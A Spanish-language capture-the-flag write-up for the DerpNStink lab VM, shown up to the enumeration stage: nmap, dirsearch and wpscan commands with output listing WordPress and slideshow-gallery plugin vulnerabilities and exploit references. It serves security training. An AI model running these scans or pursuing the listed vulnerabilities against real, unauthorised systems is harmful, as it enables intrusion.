# DerpNStink
Desarrollo del CTF DerpNStink

## 1. Configuración de la VM

- Download la VM: https://www.vulnhub.com/entry/derpnstink-1,221/

## 2. Escaneo de Puertos

```
# Nmap 7.91 scan initiated Wed Apr 21 17:14:59 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.56.105
Nmap scan report for 192.168.56.105
Host is up (0.00072s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:93:7E:9A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp1.jpg" width=80% />

## 3. Enumeración 

### 3.1. Enumeración HTTP

- Identificamos un wordpress, un phpmyadmin y un archivo robots.txt

```
┌──(root💀kali)-[~/tools/dirsearch]
└─# python3 dirsearch.py -u http://192.168.56.105/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt 
/root/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 1133344

Error Log: /root/tools/dirsearch/logs/errors-21-04-21_17-19-59.log

Target: http://192.168.56.105/

Output File: /root/tools/dirsearch/reports/192.168.56.105/_21-04-21_17-19-59.txt

[17:19:59] Starting: 
[17:20:20] 200 -    1KB - /index.html
[17:21:05] 403 -  287B  - /icons/     (Added to queue)
[17:21:05] 301 -  316B  - /weblog  ->  http://192.168.56.105/weblog/     (Added to queue)
[17:21:05] 301 -    0B  - /weblog/  ->  http://derpnstink.local/weblog/
[17:21:38] 200 -   53B  - /robots.txt
[17:21:42] 301 -  313B  - /php  ->  http://192.168.56.105/php/     (Added to queue)
[17:21:42] 403 -  285B  - /php/
[17:25:34] 403 -  285B  - /css/     (Added to queue)
[17:25:34] 301 -  313B  - /css  ->  http://192.168.56.105/css/
[17:25:40] 301 -  312B  - /js  ->  http://192.168.56.105/js/     (Added to queue)
[17:25:40] 403 -  284B  - /js/
[18:12:01] Starting: icons/
[18:13:03] Starting: weblog/
[18:13:27] 200 -   14KB - /weblog/index.php
[18:15:53] 200 -   19KB - /weblog/license.txt
[18:17:28] 200 -    0B  - /weblog/wp-content/     (Added to queue)
[18:17:28] 301 -  327B  - /weblog/wp-content  ->  http://192.168.56.105/weblog/wp-content/
[18:21:27] 301 -  325B  - /weblog/wp-admin  ->  http://192.168.56.105/weblog/wp-admin/     (Added to queue)
[18:21:27] 302 -    0B  - /weblog/wp-admin/  ->  http://derpnstink.local/weblog/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.105%2Fweblog%2Fwp-admin%2F&reauth=1
[18:23:01] 200 -    7KB - /weblog/readme.html
[18:32:06] 405 -   42B  - /weblog/xmlrpc.php
[18:40:51] 200 -    3KB - /weblog/wp-login.php
[19:08:02] Starting: php/
[19:08:05] 200 -    0B  - /php/info.php
[19:10:24] 301 -  324B  - /php/phpmyadmin  ->  http://192.168.56.105/php/phpmyadmin/     (Added to queue)
[19:10:24] 200 -    8KB - /php/phpmyadmin/
[20:10:24] Starting: css/
[20:14:04] Starting: js/
[20:14:06] Starting: weblog/wp-content/
[20:14:21] Starting: weblog/wp-admin/
[20:14:24] Starting: php/phpmyadmin/
[20:14:28] 200 -    8KB - /php/phpmyadmin/navigation.php
[20:14:56] 200 -    8KB - /php/phpmyadmin/index.php
[20:15:18] 403 -  303B  - /php/phpmyadmin/themes/     (Added to queue)
[20:15:18] 301 -  331B  - /php/phpmyadmin/themes  ->  http://192.168.56.105/php/phpmyadmin/themes/
[20:15:18] 200 -    8KB - /php/phpmyadmin/themes.php
[20:15:33] 403 -  305B  - /php/phpmyadmin/libraries
[20:15:33] 403 -  306B  - /php/phpmyadmin/libraries/     (Added to queue)
[20:17:16] 200 -    8KB - /php/phpmyadmin/export.php
[20:18:27] 200 -    8KB - /php/phpmyadmin/license.php
[20:18:31] 200 -    7KB - /php/phpmyadmin/webapp.php
[20:21:37] 401 -  460B  - /php/phpmyadmin/setup/     (Added to queue)
[20:21:37] 401 -  460B  - /php/phpmyadmin/setup
[20:21:45] 200 -    8KB - /php/phpmyadmin/sql.php
[20:21:45] 403 -  299B  - /php/phpmyadmin/js/     (Added to queue)
[20:21:45] 301 -  327B  - /php/phpmyadmin/js  ->  http://192.168.56.105/php/phpmyadmin/js/
[20:22:44] 403 -  303B  - /php/phpmyadmin/locale/     (Added to queue)
[20:22:44] 301 -  331B  - /php/phpmyadmin/locale  ->  http://192.168.56.105/php/phpmyadmin/locale/
[20:23:43] 302 -    0B  - /php/phpmyadmin/url.php  ->  http://192.168.56.105/php/phpmyadmin/
[20:30:00] 200 -    8KB - /php/phpmyadmin/import.php
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp2.jpg" width=80% />

### 3.2. Enumeración WORDPRESS

- Para ingresar al Wordpress nos toca modificar el archivo HOSTS en Kali Linux (una configuración clásica cuando se trata de Wordpress).

```
┌──(root💀kali)-[~/DERP]
└─# wpscan --api-token TOKEN --url=http://derpnstink.local/weblog/ -e ap,u --plugins-detection aggressive  
____________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://derpnstink.local/weblog/ [192.168.56.105]
[+] Started: Wed Apr 21 17:49:39 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'
 |
 | [!] 31 vulnerabilities identified:
 |
 | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
 |     Fixed in: 4.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/6ac45244-9f09-4e9c-92f3-f339d450fe72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/42720
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.6.11
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.6.12
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.6.13
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.6.14
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.6.15
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.6.16
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.6.17
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.6.17
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.6.17
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.6.17
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.6.18
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.6.18
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.6.18
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.6.18
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.6.18
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Aggressive Methods)

 Checking Known Locations -: |======================================================================================================|
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://derpnstink.local/weblog/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.1.11 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/akismet/readme.txt

[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2019-07-12T13:09:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
 | [!] The version is out of date, the latest version is 1.6.12
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/, status: 403
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: Slideshow Gallery < 1.4.7 - Arbitrary File Upload
 |     Fixed in: 1.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/b1b5f1ba-267d-4b34-b012-7a047b1d77b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
 |      - https://www.exploit-db.com/exploits/34681/
 |      - https://www.exploit-db.com/exploits/34514/
 |      - https://seclists.org/bugtraq/2014/Sep/1
 |      - https://packetstormsecurity.com/files/131526/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
 |
 | [!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
 |     Fixed in: 1.5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/f161974c-36bb-4fe7-bbf8-283cfe9d66ca
 |      - http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
 |      - http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
 |
 | [!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 1.6.5
 |     References:
 |      - https://wpscan.com/vulnerability/bdf963a1-c0f9-4af7-a67c-0c6d9d0b4ab1
 |      - https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html
 |      - https://plugins.trac.wordpress.org/changeset/1609730/slideshow-gallery
 |
 | [!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 1.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/a9056033-97c7-4753-822f-faf99f4081e2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17946
 |      - https://www.defensecode.com/advisories/DC-2017-01-014_WordPress_Tribulant_Slideshow_Gallery_Plugin_Advisory.pdf
 |      - https://packetstormsecurity.com/files/142079/
 |
